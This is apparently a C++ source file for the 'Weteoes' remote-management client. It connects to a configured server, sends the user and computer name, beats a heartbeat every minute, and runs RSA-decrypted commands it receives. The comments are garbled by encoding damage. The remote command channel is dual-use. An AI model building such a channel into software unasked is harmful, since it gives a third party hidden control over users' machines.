#ifndef ServerSocketClass_H
#define ServerSocketClass_H
#include <Weteoes/Loading.h>
#include <Weteoes/Model/Sockets/CSocket.h>

class ServerSocketClass : public CSocketClass
{
public:
	static ServerSocketClass use; // this Class

private:
	virtual void Loading(); // ��ʼ��
	virtual SOCKADDR_IN Socket_Initialization(); // Initialization Socket
	virtual void Socket_RunShell(std::string); // ��������
	virtual void Send_Socket_While(SOCKET); // ѭ������Socket
	virtual std::string GetFirstSendData(); // ��һ�η��͵�����

private:
	std::string EncryptData(std::string); // ��������
};
#endif

#ifndef ServerSocketClass_CPP
#define ServerSocketClass_CPP
#include <Weteoes/Application/RSA.h>
#include <Weteoes/Application/Config.h>
#include <Weteoes/Application/Actions/Software.h>
#include <Weteoes/Dll/ManagementDll.h>
#include <Weteoes/Dll/ClientDll.h>

ServerSocketClass ServerSocketClass::use;

void ServerSocketClass::Loading() {
	socketCache = ConfigClass::Socket_Cache; // ��������С
}
SOCKADDR_IN ServerSocketClass::Socket_Initialization() {
	SOCKADDR_IN server;
	memset(&server, 0, sizeof(SOCKADDR_IN)); //��ʼ��(�Ƚ������ַ��server��Ϊȫ0)
	std::string URL_Socket = ManagementDll::Get((char*)"URL_Socket");
	int Socket_Port = atoi(ManagementDll::Get((char*)"Socket_Port"));
	if (URL_Socket.empty() || Socket_Port <= 0) { return server; }
	server.sin_family = PF_INET; //������ַ��ʽ��TCP/IP��ַ��ʽ
	server.sin_port = htons(Socket_Port); //ָ�����ӷ������Ķ˿ں�
	/* �������� */
getDomainIp:
	std::string ServerIp = GetIpByName(URL_Socket); //��Ϊ������Ҫת��
	if (ServerIp == "") { Sleep(2000); goto getDomainIp; }
	inet_pton(AF_INET, ServerIp.c_str(), &server.sin_addr.S_un.S_addr);//�ַ��������·��ַ
	return server;
}
void ServerSocketClass::Socket_RunShell(std::string data) { //ִ�ж���
	std::string re = RSAClass().B_PrivateUnEncode(data); //��������
	if (re == "") { return; } //����ʧ��
	if (re == ConfigClass::Socket_Error) { //�����Error(�������)
		SocketStopFlac = true;
		SoftwareClass().RebootSoftware();
		return;
	}
	// �����Success
	else if (re == ConfigClass::Socket_OK) { return; }
	else { //�������Ļ�
		if (!ClientDll::Client_Entrance((char*)re.c_str())) { //ִ�У�������ǺϷ���Ϣ
			return;
		}
	}
}
void ServerSocketClass::Send_Socket_While(SOCKET socket) {
	while (1) {
		if (!Send_Socket(sClient, EncryptData(ConfigClass::Socket_Hello))) { // Error
			return;
		}
		else { ::Sleep(1000 * 60); }
	}
}
std::string ServerSocketClass::GetFirstSendData() {
	if (!ConfigDll().Loading()) { return ""; }
	ConfigDllStruct::UserConfig_ UserConfig = ConfigDll::Config_ReadUser();
	ConfigDllStruct::ComputerConfig_ ComputerConfig = ConfigDll::Config_ReadComputer();
	std::string b = "Weteoes_Server_";
	b += std::string(UserConfig.w) + "|" + std::string(ComputerConfig.ComputerName);
	return EncryptData(b);
}
std::string ServerSocketClass::EncryptData(std::string data) {
	return RSAClass().A_PublicEncode(data);
}
#endif